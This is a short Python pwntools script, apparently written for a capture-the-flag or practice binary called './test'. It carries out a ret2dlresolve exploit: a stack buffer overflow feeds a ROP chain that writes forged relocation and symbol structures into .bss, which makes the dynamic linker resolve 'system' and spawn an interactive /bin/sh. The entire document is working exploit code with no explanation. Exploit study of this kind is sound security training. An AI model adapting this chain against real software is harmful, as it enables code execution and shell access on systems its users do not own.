from pwn import *
from time import sleep

t = process('./test')
print("Attach...")
sleep(3)

binary = ELF('./test')

def sec_addr(name):
    return binary.get_section_by_name(name).header['sh_addr']

plt_0   = sec_addr('.plt')
rel_plt = sec_addr('.rel.plt')
dynsym  = sec_addr('.dynsym')
dynstr  = sec_addr('.dynstr')

bss = binary.bss()
write_loc = 0x0804A038
index = bss - rel_plt

buf = 'A'*36

pop3_ret = 0x080484e9
# Read data into bss to make fake structs
buf += p32(binary.plt['read'])
buf += p32(pop3_ret)
buf += p32(0)
buf += p32(bss)
buf += p32(0x200)

# ret2dlresolve
buf += p32(plt_0)
buf += p32(index)      # JMPREL + index == .bss
buf += p32(0x41414141) # return address
buf += p32(bss + 35)   # /bin/sh

t.sendline(buf)

sleep(0.5)

fake_sym_addr = bss + 8
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf) # symtab structures are all 16 bytes, need to work out num of alignment bytes
fake_sym_addr += align
dynsym_index = (fake_sym_addr - dynsym) / 16
log.info("dynsym_index: {}".format(dynsym_index))

fake_reloc = p32(0x0804A00C) + p32(0x07 | (dynsym_index << 8)) # fake .rel.plt entry
st_name = (fake_sym_addr + 0x10 ) - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12) # fake .dynsym entry

buf = fake_reloc
buf += 'A'*align
buf += fake_sym
buf += "system\0"
buf += "/bin/sh\0"
t.sendline(buf)

t.interactive()
